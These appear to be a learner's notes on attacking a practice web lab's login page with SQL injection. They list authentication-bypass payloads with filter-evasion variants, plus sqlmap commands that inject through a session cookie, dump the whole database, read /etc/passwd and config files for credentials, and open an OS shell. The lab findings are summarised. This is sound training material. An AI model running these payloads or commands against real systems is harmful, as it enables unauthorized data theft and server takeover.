## SQL Injection Checklist for Login Page : 

1. **Test Default Login :**

	- Since i am in the lab, the default creds are : `jeremy:jeremy`.

	- **In Burp Suite :**

```

2. **Confirm SQLi Vulnerability (Authentication Bypass) :**

```
## - Test Basic Bypass in Repeater:

username=admin' OR 1=1#&password=jeremy
username=jeremy' OR 1=1#&password=jeremy
username=jeremy&password=' OR ''='# 
username=admin' OR '1'='1 -- &password=jeremy
username=jeremy%27%20OR%201=1%23&password=jeremy (encoded)

## - Handle Filters:
	- If ' is blocked, try:
	
username=admin" OR "1"="1#&password=jeremy
username=jeremy%27%20OR%20%271%27=%271%23&password=jeremy

	- If spaces are blocked, use /**/:
	
username=admin'/**/OR/**/1=1#&password=jeremy
```


## Using SQLMAP : 

```

### ✅ 1. Raw Request File

`sqlmap -r request.txt --level=5 --risk=3 --batch --dump`
#### 🔍 What it does :

- Loads a **raw HTTP request** (GET or POST) from a file (`request.txt`)
- sqlmap parses everything: URL, headers, cookies, body
- Tests all parameters inside request (GET, POST, Cookies, etc.)
- Dumps data if injection is found
#### ✅ Use this when :

- - You captured a full login or post-auth request in Burp
- The injection point is deep (e.g. cookie, header, POST field)
- You want **complete control over the entire request**

### ✅ 2. Cookie Injection Without Marker

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=abcdb" --level=5 --risk=3 --dump --batch`
#### 🔍 What it does :

- Targets SQLi at the URL: `/labs/i0x02.php`
- Uses **your provided session cookie**
- **BUT** doesn't specify where in the cookie to inject (no `*`)
- sqlmap **guesses** the injection point
#### ⚠️ Not ideal when :

- You **already know** the cookie is injectable `→` use `*` instead!

### ✅ 3. Cookie Injection With Explicit Marker

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=1*" --level=5 --risk=3 --technique=BEUSTQ --dump`
#### 🔍 What it does :

- Tells sqlmap: "**inject right at the `*` in the cookie value**"
- Focuses only on the **cookie injection point**
- Uses all techniques: Boolean, Error, UNION, Stacked, Time-based, Second-order
- Dumps data if vulnerable
#### ✅ Use this when :

- You know the **session cookie is injectable**
- You want to **speed up testing** and be precise

### ✅ 4. POST Authenticated Attack with Injection Marker 

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=abcdb*" --data="username=jeremy&password=jeremy" --level=5 --risk=3 --technique=BEUSTQ --batch`
#### ### 🔍 What it does:

- Injects **in the cookie**, at the exact `*` location
- Sends **POST data** to simulate a login (`username=jeremy&password=jeremy`)
- Used on **authenticated pages**
- Enables all techniques and batch mode
### ✅ Use this when:

- You're attacking a **login-required** endpoint
- The cookie is **authenticated session**
- You want to **target post-login SQLi in cookies**

### What i found in the SQLi LAB - 2

#### 💥 sqlmap confirmed:

- ✅ Injection is in the **`session` cookie**
    
- ✅ Exploitable via:
    
    - **Boolean-based blind**
        
    - **Time-based blind**
        
- ✅ Back-end DBMS: **MySQL ≥ 5.0.12**
    
- ✅ Web app: Apache + PHP on Debian
    
- ✅ Injection works **post-auth** (using `jeremy:jeremy`)
    
- ✅ Payloads stored (cached) in the `.local/share/sqlmap/...` folder


#### Based of this we exploit :

##### 5️⃣ 🔐 Try Reading Server Files (if MySQL allows) : 

`--file-read="/etc/passwd"`

- Try `/var/www/html/config.php`, or anything with credentials.

##### 6️⃣ 💣 Try Gaining OS Shell Access : 

`--os-shell`

- ⚠️ This attempts to write a file and execute a shell command. Only do this in labs or with legal authorization.

#####  7️⃣ 🧠 Resume Session Later : 

- You can use the stored session so you don’t repeat scans :
	- `--session=/root/.local/share/sqlmap/output/localhost/session.sqlite`



##### 🧰 Bonus: Full Extraction Command (Dump All)

```
sqlmap -u "http://localhost/labs/i0x02.php" \
--cookie="session=abcdb*" \
--data="username=jeremy&password=jeremy" \
--dump-all --batch
```

- 💡 Let it run. Go grab coffee. Come back to the full DB.
